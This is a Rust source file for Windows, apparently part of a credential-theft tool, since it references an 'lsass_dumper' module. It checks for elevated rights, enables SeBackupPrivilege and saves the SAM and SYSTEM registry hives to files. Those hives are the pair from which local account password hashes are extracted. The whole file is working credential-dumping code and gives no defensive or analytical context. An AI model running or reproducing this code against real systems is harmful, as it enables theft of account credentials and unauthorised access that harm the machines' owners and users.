use std::ffi::OsStr;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use winapi::shared::minwindef::{DWORD, HKEY};
use winapi::shared::winerror::ERROR_SUCCESS;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::DeleteFileW;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::{AdjustTokenPrivileges, GetTokenInformation};
use winapi::um::winbase::LookupPrivilegeValueW;
use winapi::um::winnt::{
    HANDLE, KEY_READ, LUID, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_ELEVATION,
    TOKEN_PRIVILEGES, TOKEN_QUERY, TokenElevation,
};
use winapi::um::winreg::{
    RegCloseKey, RegOpenKeyExW, RegSaveKeyW, HKEY_LOCAL_MACHINE,
};

use crate::lsass_dumper::SafeHandle;

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

pub fn is_elevated() -> bool {
    unsafe {
        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let token = SafeHandle::new(token);

        let mut elevation: TOKEN_ELEVATION = mem::zeroed();
        let mut size: DWORD = mem::size_of::<TOKEN_ELEVATION>() as DWORD;

        if GetTokenInformation(
            token.raw(),
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            size,
            &mut size,
        ) == 0
        {
            return false;
        }

        elevation.TokenIsElevated != 0
    }
}

pub fn enable_backup_privilege() -> bool {
    let priv_name = to_wide("SeBackupPrivilege");

    unsafe {
        let mut token: HANDLE = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token) == 0 {
            return false;
        }
        let token = SafeHandle::new(token);

        let mut luid: LUID = mem::zeroed();
        if LookupPrivilegeValueW(ptr::null(), priv_name.as_ptr(), &mut luid) == 0 {
            return false;
        }

        let mut tp: TOKEN_PRIVILEGES = mem::zeroed();
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if AdjustTokenPrivileges(token.raw(), 0, &mut tp, 0, ptr::null_mut(), ptr::null_mut()) == 0
        {
            return false;
        }

        GetLastError() == ERROR_SUCCESS
    }
}

fn save_hive(sub_key: &str, output_path: &str) -> bool {
    let sub_key_wide = to_wide(sub_key);
    let output_wide = to_wide(output_path);

    unsafe {
        // Delete existing file so RegSaveKeyW doesn't fail
        DeleteFileW(output_wide.as_ptr());

        let mut hkey: HKEY = ptr::null_mut();
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sub_key_wide.as_ptr(),
            0,
            KEY_READ,
            &mut hkey,
        );

        if status != ERROR_SUCCESS as i32 {
            eprintln!("  [-] Failed to open {} (error: {})", sub_key, status);
            return false;
        }

        let status = RegSaveKeyW(hkey, output_wide.as_ptr(), ptr::null_mut());
        RegCloseKey(hkey);

        if status != ERROR_SUCCESS as i32 {
            eprintln!("  [-] Failed to save {} (error: {})", sub_key, status);
            return false;
        }

        true
    }
}

pub fn dump_sam_and_system(sam_path: &str, system_path: &str) -> bool {
    let sam_ok = save_hive("SAM", sam_path);
    let sys_ok = save_hive("SYSTEM", system_path);
    sam_ok && sys_ok
}
